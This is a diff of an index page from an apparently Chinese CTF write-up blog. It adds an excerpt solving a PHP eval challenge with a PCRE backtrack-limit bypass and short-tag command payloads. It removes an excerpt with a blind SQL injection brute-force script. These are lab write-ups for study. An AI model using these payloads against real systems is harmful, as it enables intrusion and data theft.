@@ -131,6 +131,48 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/09/05/NISACTF2022-middlerce-wp/" >NISACTF2022-middlerce-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-05
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>严格正则过滤，尝试PCRE回溯绕过</p>
+<blockquote>
+<p>具体见 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+</blockquote>
+<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;system(\&#x27;ls\&#x27;);&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># 回溯得用@^等特殊字符</span></span><br><span class="line">data = &#123; <span class="string">&#x27;letter&#x27;</span>: js &#125;</span><br><span class="line">res = requests.post(url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28296/&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>但是得到<code>差一点点捏</code>  尝试多次发现system, exec, assert等都被过滤   尝试使用短标签</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`ls`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>?&gt;闭合了eval自带的&lt;?标签  接下来使用了短标签   <code>&lt;?=</code>相当于<code>&lt;?echo</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># cat, tac, flag都被过滤</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/09/05/NISACTF2022-middlerce-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/" >X-CTF Quals2016 b0verfl0w-wp</a>
 								</h3>
 							</div>
@@ -577,44 +619,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/28/CISCN2019-华北Day2-wp/" >CISCN2019-华北Day2-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-28
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1">题目链接</a></p>
-<p>尝试发现存在过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">0</span>	<span class="string">&quot;Error Occured When Fetch Result.&quot;</span></span><br><span class="line">id = <span class="number">1</span>	<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">id = <span class="number">2</span>	<span class="string">&quot;Do you want to be my girlfriend?&quot;</span></span><br><span class="line">id = &#123;被过滤部分&#125;	<span class="string">&quot;SQL Injection Checked.&quot;</span></span><br><span class="line">id = &#123;其他&#125;	<span class="string">&quot;bool(false)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>fuzz发现空格被过滤，大部分函数都没被过滤</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/28/CISCN2019-%E5%8D%8E%E5%8C%97Day2-wp/0x1.png?raw=true" alt="img"></p>
-<p>尝试<code>0^1</code>发现回显对应1的内容，猜测为数字注入，可直接写表达式</p>
-<p>尝试<code>if(1,1,0)</code>，同样对应1的内容</p>
-<p>则可通过<code>if((ascii(substr((select(flag)from(flag)),1,1))=78),1,0)</code>来判断flag中每一位的内容（想更快也可以把等号换成大于号 用二分法）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&#x27;ufesridnophmabcgjklqtvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#x27;</span>	</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28761&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">		data = <span class="string">f&#x27;if((ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>),1,0)&#x27;</span></span><br><span class="line">		</span><br><span class="line">		res = requests.post(url = url, data = &#123;<span class="string">&quot;id&quot;</span>: data&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			flag += j</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/08/28/CISCN2019-华北Day2-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -664,6 +668,8 @@
 		
 			<li><a href="/categories/CVE/">CVE<span>12</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>1</span></a></li>
+		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
@@ -687,45 +693,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
 		
-			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
 		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
 		
-			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
-		
-			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
+			<li><a href="/tags/nodejs/">nodejs<span>5</span></a></li>
 		
 			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
 		
-			<li><a href="/tags/php原生类/">php原生类<span>1</span></a></li>
+			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
 		
-			<li><a href="/tags/jdbc/">jdbc<span>2</span></a></li>
+			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
+		
+			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
+		
+			<li><a href="/tags/sha1/">sha1<span>1</span></a></li>
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/nssctf/">nssctf<span>60</span></a></li>
+		
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
 		
 			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>19</span></a></li>
+			<li><a href="/tags/Hack-The-Box/">Hack The Box<span>1</span></a></li>
 		
-			<li><a href="/tags/seccon2019/">seccon2019<span>1</span></a></li>
+			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
 		
-			<li><a href="/tags/watevrctf2019/">watevrctf2019<span>1</span></a></li>
-		
-			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
-		
-			<li><a href="/tags/md5/">md5<span>1</span></a></li>
-		
-			<li><a href="/tags/afr/">afr<span>2</span></a></li>
-		
-			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
-		
-			<li><a href="/tags/PUT/">PUT<span>1</span></a></li>
-		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
+			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>129</span></a></li>
@@ -741,6 +747,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/02/13/J-Mybatis/" ><i class="fa fa-file-o"></i>mybatis学习</a>
+      </li>
+    
+      <li>
         <a href="/2024/01/24/CISCN2023-DeserBug-wp/" ><i class="fa fa-file-o"></i>CISCN2023-DeserBug-wp</a>
       </li>
     
@@ -754,10 +764,6 @@
     
       <li>
         <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
-      </li>
-    
-      <li>
-        <a href="/2024/01/13/JDBC反序列化/" ><i class="fa fa-file-o"></i>JDBC反序列化</a>
       </li>
     
   </ul>
